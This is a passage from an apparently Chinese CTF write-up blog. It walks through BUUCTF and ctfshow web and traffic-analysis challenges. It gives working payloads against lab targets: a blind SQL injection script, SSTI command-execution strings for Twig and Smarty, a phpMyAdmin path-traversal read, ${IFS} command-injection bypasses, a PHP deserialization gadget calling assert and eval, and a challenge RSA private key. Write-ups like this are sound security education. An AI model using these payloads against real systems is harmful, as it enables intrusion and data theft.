<span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> letf &lt; right:</span><br><span class="line"></span><br><span class="line">mid = (letf+right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line"></span><br><span class="line">letf = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">right = mid</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line"></span><br><span class="line">flag += <span class="built_in">chr</span>(letf)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>运行后拿到flag<img src="/img/17buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><blockquote><p>先欣赏一下可爱小猫，可恶啊，小猫怎么这么可爱<br><img src="/img/18buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>加一个’后报错信息中有include,猜测考察的是文件包含&gt;<br><img src="/img/19buuctf.png" alt="输入图片说明"><img src="/img/20buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>我们传入的信息后面会自动加上.php,因而我们传入的时候不用再加.php</p><p>使用伪协议读flag还是提示要存在狗或猫，但是读index，却出来了源码，得到解题信息<img src="/img/21buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>base64解码后发现要求必须存在这三者的一个<br><img src="/img/22buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>随便找个地方加上即可<img src="/img/23buuctf.png" alt="输入图片说明"></p></blockquote><p><img src="/img/24buuctf.png" alt="输入图片说明"></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="/img/25buuctf.png" alt="输入图片说明"><img src="/img/26buuctf.png" alt="输入图片说明"></p><blockquote><p>BP抓包后发现ssti漏洞</p></blockquote><blockquote><p>执行rce拿到flag<br><code>&#123;&#123;&#125;&#125;</code>里的rce不用带;，不然会报错<img src="/img/27buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><blockquote><p>这道题总感觉似曾相识，有一道类似的题目最后考察的是反序列化</p></blockquote><p><img src="/img/28buuctf.png" alt="输入图片说明"></p><blockquote><p>首先先看一下代码，第一关是text文件内容要是题目所给的内容，我们使用data伪协议就可以了，后面写的内容如果没有&lt;?php头就会被识别为文本，正如题意</p></blockquote><blockquote><p>第一关?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,I have a dream<img src="/img/29buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>看第二关要包含file,并且file不能含有flag,我们根据题目提示先访问next.php<br>发现直接包含是看不到的,考虑存在过滤，这里使用filter伪协议进行绕过，看到nect的内容<img src="/img/30buuctf.png" alt="输入图片说明"></p></blockquote><p><img src="/img/31buuctf.png" alt="输入图片说明"></p><blockquote><p>解码后得到的是下面这一段内容<img src="/img/32buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>刚开始也是一头雾水，看不懂这写的是什么玩意，投喂给AI后，发现了解到有这么一个漏洞<code>**正则替换漏洞（</code>preg_replace<code>的</code>&#x2F;e<code>修饰符）**</code><br>我们传入它就能执行我们的命令</p></blockquote><blockquote><p>例如下面尝试执行phpinfo()<br><img src="/img/33buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>但是这里不能直接执行system(“ls”);类的语句<br>我们只能另寻僻静<br>我们可以利用这个地方<img src="/img/34buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>执行系统命令，最终拿到flag<br><img src="/img/35buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><blockquote><p>御剑扫了一遍，发现什么也没有<br>BP抓包也没什么有用的信息，最后发现是git文件泄露<br>这里使用GitHack拿到源文件<br><img src="/img/36buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>好麻烦，直接碰运气吧<br><code>var_dump(show_source(array_rand(array_flip(scandir(current(localeconv()))))));</code><br>随机打开文件，多点几次，总能看到flag，最终拿到flag<br><img src="/img/37buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><blockquote><p>算是开了眼界了，题目还可以这样考<br>dirsearch搜出来一个路径<br><a href="http://ec7bff2c-c04c-4ec5-b00d-5b5f2fc08b0d.node5.buuoj.cn/phpmyadmin/">http://ec7bff2c-c04c-4ec5-b00d-5b5f2fc08b0d.node5.buuoj.cn/phpmyadmin/</a><br>进去后发现是一个数据库，和题目也就对上了<br><img src="/img/38buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这个版本存在任意文件读取漏洞<br>语句为?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<br>这里通过目录穿越读到根目录的flag</p></blockquote><p><img src="/img/39buuctf.png" alt="输入图片说明"></p><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><blockquote><p>首先要找到真正的题目，访问robots.txt,访问得到的网址，使用Hackbar看到真正的题目<img src="/img/40buuctf.png" alt="输入图片说明"><img src="/img/41buuctf.png" alt="输入图片说明"><img src="/img/42buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>总共有三关<br>第一关<code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code><br>这里用到科学计数法的一个特性<br>例如第一个比较的时候2e5只会读2<br>而2e5+1读到的就是200001<br>可以利用这个特性绕过</p></blockquote><blockquote><p>第二关<br><code>$md5==md5($md5)</code><br>这里使用特殊值<code>0e215962017</code><br>可以看这篇文章，写的挺全的</p></blockquote><p><img src="/img/43buuctf.png" alt="输入图片说明"></p><blockquote><p>第三关<br><code>!strstr($get_flag,&quot; &quot;</code> 不能有空<br><code>str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag)</code>将$get_flag中的cat替换为wctf2020<br>很容易，空格用${IFS}代替就可以了<br>使用tac而不是用cat<br>可以绕过拿到flag</p></blockquote><blockquote><p>最终payload为?num&#x3D;2e5&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br>拿到flag<img src="/img/44buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><blockquote><p>这里就是注意题目，cookie,这是做这道题的重点</p></blockquote><blockquote><p>做过好几道这个页面的题目了，几乎考察的都是ssti，这道题也一样，知识位置换了</p></blockquote><blockquote><p>传入49<br>返回49，判断存在ssti模板注入漏洞<img src="/img/45buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>使用hackber发现cookie处有个user，值就是我们传入的值，这里我们要使用BP，修改user的值从而进行模板注入，不然做不出来</p></blockquote><blockquote><p>我们根据这张表进行尝试<br><img src="/img/46buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>尝试到49处发现没有原样返回，而是返回了个49，说明是Jinja2或者Twig</p></blockquote><blockquote><p>那么这两个该怎么判断呢？判断方法如下<br>传入49<br>返回49—&gt;Jinja<br>返回7777777—&gt;Twig</p></blockquote><blockquote><p>这里判断是Jinja<br>传入<code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code><br>拿到flag<br><img src="/img/47buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><blockquote><p>这道题不难，但是题目好有意思，哈哈哈哈哈哈哈</p></blockquote><blockquote><p>查看源代码，发现一段代码是验证<img src="/img/48buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这里随便找个网址进行解密<br><img src="/img/49buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这里解密后传入，进入到这个抽象的网页<br>这里有个提示是购买者和‘我自己’<br>这个我自己可以通过<br>X-Forwarded-For:127.0.0.1<br>进行伪造，伪造后成功发现flag<img src="/img/50buuctf.png" alt="输入图片说明"><img src="/img/51buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><blockquote><p>直接curl+u查看网页源代码<br>这里看到一个time.php?source，访问一下试试<img src="/img/52buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>就可以看到真正的题目了，是一道简单的反序列化，但是还是有个坑<br>如果连接蚁剑+提权<br>会拿到一个假的flag,刚开始还以为题目出错了，原来是我太菜了<br><img src="/img/53buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>嘿，这是假的！那真的在哪儿呢？phpinfo()!</p></blockquote><blockquote><p>附上代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;eval(phpinfo())&quot;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure><blockquote><p>拿到flag<img src="/img/54buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><blockquote><p>题目重点总共有两个</p><p>smarty是一种模板<br>这里考虑是ssti模板注入</p></blockquote><blockquote><p>那么注入点在哪里呢？这里有个XFF比较可疑，尝试一下发现可以<img src="/img/55buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>构造payload<br><code>&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code><br>拿到flag<img src="/img/56buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h3><blockquote><p>要是ctf题目都是这个难度就好了<br>考察优秀的访问源代码能力<br><img src="/img/57buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><blockquote><p>直接过滤flag拿到flag<img src="/img/58buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="DDCTF2018-流量分析"><a href="#DDCTF2018-流量分析" class="headerlink" title="[DDCTF2018]流量分析"></a>[DDCTF2018]流量分析</h3><blockquote><p>首先我们要寻找这个key<br>再通过保密协议TLS拿到flag<br><img src="/img/59buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>密钥首先想到的就是key，这里直接过滤key<br>发现一大长串base64编码后的字符<br>解码时发现时PNG图片<img src="/img/60buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>这里使用看图识字提出来字符，进行拼接<br>字符为</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>编辑–&gt;首选项–&gt;Protocols–&gt;TLS–&gt;Edit<br>在本地写个txt，把密钥写进去，读入<br><img src="/img/61buuctf.png" alt="输入图片说明"></p></blockquote><blockquote><p>过滤http–&gt;追踪<br><img src="/img/62buuctf.png" alt="输入图片说明"><img src="/img/63buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="第九章-9-3-1-HTTP流量分析-http流量分析"><a href="#第九章-9-3-1-HTTP流量分析-http流量分析" class="headerlink" title="[第九章][9.3.1 HTTP流量分析]http流量分析"></a>[第九章][9.3.1 HTTP流量分析]http流量分析</h3><blockquote><p>直接过滤flag拿到flag<img src="/img/64buuctf.png" alt="输入图片说明"></p></blockquote><h3 id="第九章-9-3-2-webshell混淆流量分析-webshell流量分析"><a href="#第九章-9-3-2-webshell混淆流量分析-webshell流量分析" class="headerlink" title="[第九章][9.3.2 webshell混淆流量分析]webshell流量分析"></a>[第九章][9.3.2 webshell混淆流量分析]webshell流量分析</h3><blockquote><p>丢CTF_NetA工具里了,一把梭<br><img src="/img/65buuctf.png" alt="输入图片说明"></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 wp （持续更新)</title>
      <link href="/2025/01/26/ctfshow%20web%E5%85%A5%E9%97%A8%20wp%20(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2025/01/26/ctfshow%20web%E5%85%A5%E9%97%A8%20wp%20(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>查看网页源代码<br><img src="/img/sj0.jpg" alt="输入图片说明"></p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>这里没办法直接右键查看源代码<br>方法一：在网址上输入view-source:<img src="/img/sj1.jpg" alt="输入图片说明"><br>方法二：直接ctrl+u就可以直接查看源代码</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>使用BP或者harkbar就可以看到<br><img src="/img/sj2.jpg" alt="输入图片说明"></p></blockquote><h3 id="web4（robots-txt"><a href="#web4（robots-txt" class="headerlink" title="web4（robots.txt)"></a>web4（robots.txt)</h3><blockquote><p>机器人协议<br>首先访问机器人协议看到它不像让你看到那些信息，再访问就可以拿到flag<br><img src="/img/sj3.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/sj4.jpg" alt="输入图片说明"></p><h3 id="web5-index-phps"><a href="#web5-index-phps" class="headerlink" title="web5(index.phps)"></a>web5(index.phps)</h3><blockquote><p>根据题目提示，存在phps源码泄露，直接访问index.phps即可拿到flag<br><img src="/img/sj5.jpg" alt="输入图片说明"></p></blockquote><h3 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6(www.zip)"></a>web6(<a href="http://www.zip/">www.zip</a>)</h3><blockquote><p>直接访问<a href="http://www.zip就可以拿到flag/">www.zip就可以拿到flag</a><br><img src="/img/sj6.jpg" alt="输入图片说明"></p></blockquote><h3 id="web7-git"><a href="#web7-git" class="headerlink" title="web7(&#x2F;.git&#x2F;)"></a>web7(&#x2F;.git&#x2F;)</h3><blockquote><p>版本控制很重要，但不要部署到生产环境更重要,直接访问&#x2F;.git&#x2F;就能拿到flag<br><img src="/img/sj7.jpg" alt="输入图片说明"></p></blockquote><h3 id="web8-svn"><a href="#web8-svn" class="headerlink" title="web8(&#x2F;.svn&#x2F;)"></a>web8(&#x2F;.svn&#x2F;)</h3><blockquote><p>版本控制很重要，但不要部署到生产环境更重要,直接访问&#x2F;.svn&#x2F;就能拿到flag<br><img src="/img/sj8.jpg" alt="输入图片说明"></p></blockquote><h3 id="web9-index-php-swp"><a href="#web9-index-php-swp" class="headerlink" title="web9(index.php.swp)"></a>web9(index.php.swp)</h3><blockquote><p>原理<br>vim 在编辑文本时就会创建临时缓存文件，用来备份缓冲区中的内容。当程序异常退出时会被保留下来，因此可以通过该缓存文件恢复原始文件内容。<br>直接访问index.php.swp就可以拿到flag<br><img src="/img/sj9.jpg" alt="输入图片说明"></p></blockquote><h3 id="web10-查看cookie"><a href="#web10-查看cookie" class="headerlink" title="web10(查看cookie)"></a>web10(查看cookie)</h3><p><img src="/img/sj10.jpg" alt="输入图片说明"></p><h3 id="web12-admin-找密码"><a href="#web12-admin-找密码" class="headerlink" title="web12(&#x2F;admin&#x2F;+找密码)"></a>web12(&#x2F;admin&#x2F;+找密码)</h3><blockquote><p>密码一般是一串数字，这里最像密码的就是这串数字<br>访问&#x2F;admin&#x2F;后，账号admin密码是那串数字拿到flag<img src="/img/sj11.jpg" alt="输入图片说明"><img src="/img/sj12.jpg" alt="输入图片说明"></p></blockquote><h3 id="web13-找登录地址-密码"><a href="#web13-找登录地址-密码" class="headerlink" title="web13(找登录地址+密码)"></a>web13(找登录地址+密码)</h3><p><img src="/img/sj13.jpg" alt="输入图片说明"></p><blockquote><p>这里发现其他地方都是首字母大写，但是这里却是小写字母，发现可以点击，进去后拿到管理员登陆地址和账号密码</p></blockquote><p><img src="/img/sj14.jpg" alt="输入图片说明"><br><img src="/img/sj15.jpg" alt="输入图片说明"><br><img src="/img/sj16.jpg" alt="输入图片说明"></p><h3 id="web14-editor"><a href="#web14-editor" class="headerlink" title="web14(&#x2F;editor&#x2F;)"></a>web14(&#x2F;editor&#x2F;)</h3><blockquote><p>根据题目中提示的信息，访问&#x2F;editor&#x2F;可以进入一个编辑器，在编辑器中找到上传，有个上传空间，在里面找到flag的路径再进行访问就能拿到flag<br><img src="/img/sj17.jpg" alt="输入图片说明"><br><img src="/img/sj18.jpg" alt="输入图片说明"><br><img src="/img/sj19.jpg" alt="输入图片说明"></p></blockquote><h3 id="web15-邮箱找地址"><a href="#web15-邮箱找地址" class="headerlink" title="web15(邮箱找地址)"></a>web15(邮箱找地址)</h3><p><img src="/img/sj20.jpg" alt="输入图片说明"></p><blockquote><p>根据邮箱上的QQ号查询用户，然后根据用户的地址忘记 密码重置密码后登录即可<img src="/img/sj21.jpg" alt="输入图片说明"></p></blockquote><h3 id="web16-tz-php"><a href="#web16-tz-php" class="headerlink" title="web16(tz.php)"></a>web16(tz.php)</h3><blockquote><p>根据题目提示中的探针，名称一般为tz.php我们直接访问可以看到信息，再访问里面的phpinfo()，一般flag就会藏在里面，然后拿到flag<img src="/img/sj22.jpg" alt="输入图片说明"></p></blockquote><p><img src="/img/sj23.jpg" alt="输入图片说明"></p><h3 id="web18-源代码"><a href="#web18-源代码" class="headerlink" title="web18(源代码)"></a>web18(源代码)</h3><blockquote><p>题目中玩到100以上就给flag<br>方法一：玩<br>方法二：访问源代码，查看后，找到大于100分后输出的内容，一段经过unicode编码的信息，然后进行解码就可以拿到flag<img src="/img/sj24.jpg" alt="输入图片说明"><img src="/img/sj25.jpg" alt="输入图片说明"><img src="/img/sj26.jpg" alt="输入图片说明"></p></blockquote><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><blockquote><p>访问源代码，发现的账号和加密后的密码，根据上面给的AES,key和iv可以尝试是AES加密，解密后拿到flag<br><img src="/img/sj27.jpg" alt="输入图片说明"><br><img src="/img/sj28.jpg" alt="输入图片说明"><br><img src="/img/sj29.jpg" alt="输入图片说明"></p></blockquote><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><blockquote><p>直接猜库名，访问db&#x2F;db.mdb可以下载数据库，搜索ctfshow就能拿到flag了<br><img src="/img/sj30.jpg" alt="输入图片说明"></p></blockquote><h3 id="web17-sql"><a href="#web17-sql" class="headerlink" title="web17(sql)"></a>web17(sql)</h3><blockquote><p>用dirsearch扫描发现&#x2F;backup.sql可以访问，访问后拿到flag<br><img src="/img/sj31.jpg" alt="输入图片说明"></p></blockquote><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><blockquote><p>这道题几乎没有任何限制<br>使用data或者filter伪协议就可以拿到flag<br><img src="/img/i.jpg" alt="输入图片说明"><br><img src="/img/i0.jpg" alt="输入图片说明"></p></blockquote><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><blockquote><p>题目意思是将php换为???<br>filter没办法用了，这里使用data伪协议可以拿到flag<br>小知识，只有一句代码的话，&lt;?php相当于&lt;?&#x3D;<img src="/img/i1.jpg" alt="输入图片说明"></p></blockquote><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><blockquote><p>题目意思是将data和php替换为???<br>使用日志包含就可以拿到flag<br><img src="/img/i2.jpg" alt="输入图片说明"></p></blockquote><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><blockquote><p>同web80</p></blockquote><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><blockquote><p>要求是输入的username和passowrd要相同，直接传入就可以<br><img src="/img/fx1.jpg" alt="输入图片说明"></p></blockquote><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><blockquote><p><code>return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</code> 这道题即使username和password与题目中的相同，也没办法修改$isVip的值，所以我们可以尝试在本地直接修改</p></blockquote><blockquote><p><code>$user = unserialize($_COOKIE[&#39;user&#39;]);</code><br>这里需要进行序列化了，并且使用写Cookie进行传入，才能拿到flag</p></blockquote><blockquote><p>因为题目中有对username和password的判断，因而仍需要传入与题目中相同的值</p></blockquote><p><img src="/img/fx2.jpg" alt="输入图片说明"></p><blockquote><p>第一处就是上面提到的改为true<br>第二处，在进行序列化的时候要进行url编码，防止一些不可见字符没有写入进去</p></blockquote><p><img src="/img/fx3.jpg" alt="输入图片说明"></p><blockquote><p>拿到flag</p></blockquote><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><blockquote><p>题目中多加了一个弱相等比较，我们可以通过反序列化对题目控制题目中的username和password来进行绕过<br>我们修改后再传入我们修改后的username和password就可以拿到flag</p></blockquote><p><img src="/img/fx4.jpg" alt="输入图片说明"></p><blockquote><p>修改isvip的值为true，并且修改username和password的值，在进行序列化，这里修改isvip的方式还可以使用下面的魔术方法<img src="/img/fx5.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>输入后拿到flag<img src="/img/fx6.jpg" alt="输入图片说明"></p></blockquote><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><blockquote><p>这里的isVip没什么用了，username和password只要传入值就可以<br>根据题目，我们可以观察到info类里面最终是一个return，没有办法利用，而backDoor里面有eval,我们可以利用解题<br><code>$this-&gt;class=new info();</code>这里创造实例的时候，我们进行修改,就可以让它创造backDoor的实例，从而调用getInfo(),修改code的值进行rce<br>修改为$this-&gt;class-new backDoor();</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span 